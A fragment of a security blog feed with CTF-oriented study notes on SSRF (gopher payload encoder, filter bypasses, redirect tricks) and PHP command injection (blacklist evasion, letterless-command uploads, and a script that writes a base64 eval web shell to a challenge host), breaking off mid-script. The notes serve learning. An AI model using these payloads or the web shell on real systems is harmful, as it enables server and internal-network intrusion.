    <category term="总结" scheme="https://www.lewiserii.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="php" scheme="https://www.lewiserii.top/tags/php/"/>
    
    <category term="反序列化" scheme="https://www.lewiserii.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="总结" scheme="https://www.lewiserii.top/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>ssrf学习总结</title>
    <link href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/ssrf%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html"/>
    <id>https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/ssrf%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html</id>
    <published>2023-02-05T04:00:00.000Z</published>
    <updated>2023-03-12T08:59:34.593Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。</p><h1 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h1><p>下面是几个可能会存在SSRF的服务器使用的函数：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。<br>readfile()：输出一个文件的内容。<br>fsockopen()：打开一个网络连接或者一个Unix 套接字连接。<br>curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。<br>fopen()：打开一个文件文件或者 URL。<br></code></pre></td></tr></table></figure><p>example:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);  <span class="hljs-comment">//创造一个curl资源</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>); <span class="hljs-comment">//设置url和相应的选项</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>); <span class="hljs-comment">// 抓取url并将其传递给浏览器</span><br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>); <span class="hljs-comment">//关闭curl资源</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="常用协议"><a href="#常用协议" class="headerlink" title="常用协议"></a>常用协议</h1><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>http协议用于访问内网资源&#x2F;扫描内网存活主机</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ssrf/ssrf-1.png"></p><h2 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h2><p>可以通过dict协议根据响应时间和内容去扫描内网开放端口以及端口上运行的服务信息</p><p>example:<br><code>dict://127.0.0.1:6379 //探测redis是否存活</code></p><h2 id="file"><a href="#file" class="headerlink" title="file"></a>file</h2><p>file协议主要用于访问本地计算机的文件，在有回显的情况下，可以用于读取文件进行查看</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ssrf/ssrf-2.png"></p><h2 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h2><p>格式：<code>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_&lt;TCP数据流&gt;</code></p><p>如果发起<code>post</code>请求，回车换行需要使用<code>%0d%0a</code>，如果多个参数，参数之间的<code>&amp;</code>也需要进行<code>URL</code>编码</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ssrf/ssrf-3.png"></p><p>通过脚本转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>payload =\<br><span class="hljs-string">&quot;&quot;&quot;POST /test.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: 36</span><br><span class="hljs-string"></span><br><span class="hljs-string">test=1</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment">#注意后面一定要有回车，回车结尾表示http请求结束</span><br>tmp = urllib.parse.quote(payload)<br>new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>result = <span class="hljs-string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+new<br>result = urllib.parse.quote(result)<br><span class="hljs-built_in">print</span>(result)       <span class="hljs-comment"># 这里因为是GET请求所以要进行两次url编码</span><br></code></pre></td></tr></table></figure><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>攻击内网<code>Redis</code>，<code>FastCGI</code>，<code>MySql</code>等服务</p><p><a href="https://xz.aliyun.com/t/5665">浅析Redis中SSRF的利用</a></p><p>利用<a href="https://github.com/tarunkant/Gopherus">Gopherus</a>工具</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">MySQL (Port-3306)<br>PostgreSQL(Port-5432)<br>FastCGI (Port-9000)<br>Memcached (Port-11211)<br>    If stored data is getting De-serialized by:<br>        Python<br>        Ruby<br>        PHP<br>Redis (Port-6379)<br>Zabbix (Port-10050)<br>SMTP (Port-25)<br></code></pre></td></tr></table></figure><h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><h2 id="ip限制"><a href="#ip限制" class="headerlink" title="ip限制"></a>ip限制</h2><p>例如限制了<code>127/172</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">进制转换<br>10进制 http://2130706433<br>8进制 http://017700000001<br>16进制  http://0x7F000001<br><br>长度限制<br>host&lt;5<br>url=http://0/flag.php<br>url=http://127.1/flag.php<br><br>host&lt;3<br>url=http://0/flag.php  //在window下代表0.0.0.0，而在liunx下代表127.0.0.1<br></code></pre></td></tr></table></figure><h2 id="url限制"><a href="#url限制" class="headerlink" title="url限制"></a>url限制</h2><blockquote><p>解析到内网的域名</p></blockquote><p><code>xip.io</code>、<code>xip.name</code>、<code>nip.io</code>、<code>sslip.io</code>等</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">192.168.0.1.xip.io &gt;&gt;&gt; 192.168.0.1<br>localhost &gt;&gt;&gt; 127.0.0.1<br></code></pre></td></tr></table></figure><blockquote><p>利用@转跳</p></blockquote><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://www.baidu.com@10.10.10.10 &gt;&gt;&gt; http://10.10.10.10<br></code></pre></td></tr></table></figure><blockquote><p>利用句号</p></blockquote><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">127。0。0。1  &gt;&gt;&gt;  127.0.0.1<br></code></pre></td></tr></table></figure><blockquote><p>利用IPv6[::]</p></blockquote><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1<br>http://[0:0:0:0:0:ffff:127.0.0.1]/    //在liunx下可用<br></code></pre></td></tr></table></figure><blockquote><p>利用短网址</p></blockquote><p>不允许出现某个字母或者限制了url长度，我们可以切换为短网址，来绕过长度的限制</p><h2 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h2><p>vps上放个php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:http://127.0.0.1/flag.php&quot;</span>);<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$schema</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>];<br><span class="hljs-variable">$ip</span>     = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;i&#x27;</span>];<br><span class="hljs-variable">$port</span>   = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-variable">$query</span>  = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;q&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$port</span>))&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: <span class="hljs-subst">$schema</span>://<span class="hljs-subst">$ip</span>/<span class="hljs-subst">$query</span>&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: <span class="hljs-subst">$schema</span>://<span class="hljs-subst">$ip</span>:<span class="hljs-subst">$port</span>/<span class="hljs-subst">$query</span>&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="enclosed-alphanumerics-绕过"><a href="#enclosed-alphanumerics-绕过" class="headerlink" title="enclosed alphanumerics 绕过"></a>enclosed alphanumerics 绕过</h2><p>一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com<br>List:<br>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ  Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿<br></code></pre></td></tr></table></figure><h2 id="DNS重绑定"><a href="#DNS重绑定" class="headerlink" title="DNS重绑定"></a>DNS重绑定</h2><p><a href="https://xz.aliyun.com/t/7495">从0到1认识DNS重绑定攻击</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ssrf&quot;&gt;&lt;a href=&quot;#ssrf&quot; class=&quot;headerlink&quot; title=&quot;ssrf&quot;&gt;&lt;/a&gt;ssrf&lt;/h1&gt;&lt;p&gt;服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，</summary>
      
    
    
    
    <category term="总结" scheme="https://www.lewiserii.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="ssrf" scheme="https://www.lewiserii.top/tags/ssrf/"/>
    
    <category term="总结" scheme="https://www.lewiserii.top/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>RCE总结</title>
    <link href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/RCE%E6%80%BB%E7%BB%93.html"/>
    <id>https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/RCE%E6%80%BB%E7%BB%93.html</id>
    <published>2023-01-10T04:00:00.000Z</published>
    <updated>2023-02-15T05:17:36.769Z</updated>
    
    <content type="html"><![CDATA[<p>部分题目环境&amp;脚本&amp;姿势来自<code>https://ctf.show/</code></p><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><p>主要有6种函数可以执行系统命令，分别是<code>system</code>,<code>passthru</code>,<code>exec</code>,<code>shell_exec</code>,<code>popen</code>,<code>pcntl_exec</code></p><h2 id="命令执行利用"><a href="#命令执行利用" class="headerlink" title="命令执行利用"></a>命令执行利用</h2><h3 id="参数值可控"><a href="#参数值可控" class="headerlink" title="参数值可控"></a>参数值可控</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls &quot;</span>.<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>直接用<code>;</code>将命令分割成两部分执行</p><p>或者用<code>&amp;&amp;</code>和<code>||</code><br><code>&amp;&amp;</code>表示前一条命令执行成功时，才执行后一条命令<br><code>||</code>表示上一条命令执行失败后，才执行下一条命令</p><h3 id="命令可控"><a href="#命令可控" class="headerlink" title="命令可控"></a>命令可控</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br></code></pre></td></tr></table></figure><p>与上题类似</p><h3 id="其他方式跳出控制范围"><a href="#其他方式跳出控制范围" class="headerlink" title="其他方式跳出控制范围"></a>其他方式跳出控制范围</h3><p><code>cd /%0apwd</code> 相当于依次执行命令<code>cd /</code>和<code>pwd</code></p><h3 id="整体可控"><a href="#整体可控" class="headerlink" title="整体可控"></a>整体可控</h3><h4 id="黑名单过滤"><a href="#黑名单过滤" class="headerlink" title="黑名单过滤"></a>黑名单过滤</h4><p>比赛中较为常见的一种类型，将关键词替换成空或其他字符<br>如果只替换成空可以利用双写绕过，如果是替换成字符那么可以用base64编码绕过或者拼接变量</p><p>常见的读取文件的命令：<code>cat</code>,<code>tac</code>,<code>od</code>,<code>nl</code>,<code>less</code>,<code>more</code>,<code>sed p</code>,<code>head</code>,<code>tail</code>,<code>sort</code>,<code>uniq</code>,<code>file -f</code><br>常见的列目录的命令：<code>ls</code>,<code>du</code><br>常用的还有通配符<code>*</code>和<code>?</code></p><p>黑名单还可以采用一些不影响执行的特定符号隔开检测的关键字</p><p>比如<br><code>cat /flag</code>–&gt;<code>ca&#39;&#39;t /flag</code>–&gt;<code>ca&quot;&quot;t /flag</code>–&gt;<code>ca\t /flag</code>–&gt;<code>ca$1t /flag</code>–&gt;<code>ca$IFS$1t /flag</code></p><h4 id="符号过滤"><a href="#符号过滤" class="headerlink" title="符号过滤"></a>符号过滤</h4><p>符号过滤也非常常见</p><p>比如可以用<code>&lt;&gt;</code>,<code>$&#123;IFS&#125;</code>,<code>$IFS$9</code>,<code>%09</code>,<code>%0b</code>,<code>%0c</code>等代替空格</p><p>再者，可以利用变量来截取</p><p>比如通过<code>env</code>命令获取到了如下变量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">PHP_EXTRA_CONFIGURE_ARGS=--enable-fpm --with-fpm-user=www-data --with-fpm-group=www-data --disable-cgi<br>USER=www-data<br>HOSTNAME=f3f5c6c3e3ee<br>PHP_INI_DIR=/usr/local/etc/php<br>SHLVL=2<br>HOME=/home/www-data<br>PHP_LDFLAGS=-Wl,-O1 -pie<br>PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64<br>PHP_MD5=<br>PHP_VERSION=7.3.22<br>GPG_KEYS=CBAF69F173A0FEA4B537F470D66C9593118BCCB6 F38252826ACD957EF380D39F2F7956BC5DA04B5D<br>PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64<br>PHP_ASC_URL=https://www.php.net/distributions/php-7.3.22.tar.xz.asc<br>PHP_URL=https://www.php.net/distributions/php-7.3.22.tar.xz<br>PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br>PHPIZE_DEPS=autoconf dpkg-dev dpkg file g++ gcc libc-dev make pkgconf re2c<br>PWD=/var/www/html<br>PHP_SHA256=0e66606d3bdab5c2ae3f778136bfe8788e574913a3d8138695e54d98562f1fb5<br>FLAG=not_flag<br></code></pre></td></tr></table></figure><p>可以通过<code>$&#123;PHPIZE_DEPS:9:1&#125;</code>或者<code>$&#123;PHP_EXTRA_CONFIGURE_ARGS:12:1&#125;</code>表示空格</p><h3 id="无字母数字命令执行"><a href="#无字母数字命令执行" class="headerlink" title="无字母数字命令执行"></a>无字母数字命令执行</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]|[0-9]/i&quot;</span>,<span class="hljs-variable">$cmd</span>))&#123;<br>    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>构造一个文件上传网页，强制上传，利用<code>?</code>匹配文件来rce</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://15763fb4-39d9-4a94-886d-313843ffdc96.challenges.ctfer.com:8080/?cmd=.%20/???/????????[@-[]&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span>/&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>抓包爆破，用<code>[@-[]</code>来匹配大写字母，可以增加读到的概率</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs text">POST /?cmd=.%20/???/????????[@-[] HTTP/1.1<br>Host: 15763fb4-39d9-4a94-886d-313843ffdc96.challenges.ctfer.com:8080<br>Content-Length: 421<br>Cache-Control: max-age=0<br>Upgrade-Insecure-Requests: 1<br>Origin: http://192.168.1.17<br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryIoD8zFE5URcUFT3b<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Referer: http://192.168.1.17/<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8<br>Connection: close<br><br>------WebKitFormBoundaryIoD8zFE5URcUFT3b<br>Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.txt&quot;<br>Content-Type: text/html<br><br><br>whoami<br>------WebKitFormBoundaryIoD8zFE5URcUFT3b--<br><br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/wuzimushuzi1.png"></p><h3 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h3><h4 id="7字符长度的命令执行"><a href="#7字符长度的命令执行" class="headerlink" title="7字符长度的命令执行"></a>7字符长度的命令执行</h4><h5 id="web目录可写"><a href="#web目录可写" class="headerlink" title="web目录可写"></a>web目录可写</h5><p>可写的情况主要利用<code>&gt;</code>写入shell到文件名中，然后利用<code>ls -t</code>命令排序，写入文件后用<code>.</code>执行。具体思路如下</p><p>在<code>linux</code>中，可以利用<code>&gt;aa</code>创建一个文件，文件名就是<code>aa</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce7-1.png"></p><p>执行一次<code>ls -t&gt;0</code>，然后<code>cat 0</code>，会发现文件中按照创建文件的先后顺序进行了排序，那么如果将里面的内容替换成恶意的一句话木马，然后执行，不就能rce了吗</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce7-3.png"></p><p>为了避免符号的原因导致写入失败，先把一句话木马转成base64形式<br><code>&lt;?php eval($_GET[1]);</code></p><p><code>PD9waHAgZXZhbCgkX0dFVFsxXSk7</code></p><p><code>echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d&gt;1.php</code></p><p>然后对要执行的命令进行分割，不超过7个一组，注意每组后面加个<code>\</code>，在linux中表示一行未输入完</p><p>最后<code>0</code>文件中应该是如下内容</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/rce7-2.png"></p><p>执行<code>. 0</code>，就会生成一个<code>1.php</code></p><p>整合脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:55:01</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://75026f50-dfd3-4928-9a7c-c1d59c860cb3.challenge.ctf.show/&quot;</span><br><br>payload=[<br><span class="hljs-string">&quot;&gt;hp&quot;</span>,<br><span class="hljs-string">&quot;&gt;1.p\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;d\\&gt;\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;\\ -\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;e64\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;bas\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;7\\|\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;XSk\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;Fsx\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;dFV\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;kX0\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;bCg\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;XZh\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;AgZ\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;waH\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;PD9\\&quot;</span>,<br><span class="hljs-string">&quot;&gt;o\\ \\&quot;</span>,<br><span class="hljs-string">&quot;&gt;ech\\&quot;</span>,<br><span class="hljs-string">&quot;ls -t&gt;0&quot;</span>,<br><span class="hljs-string">&quot;. 0&quot;</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>data=&#123;<br><span 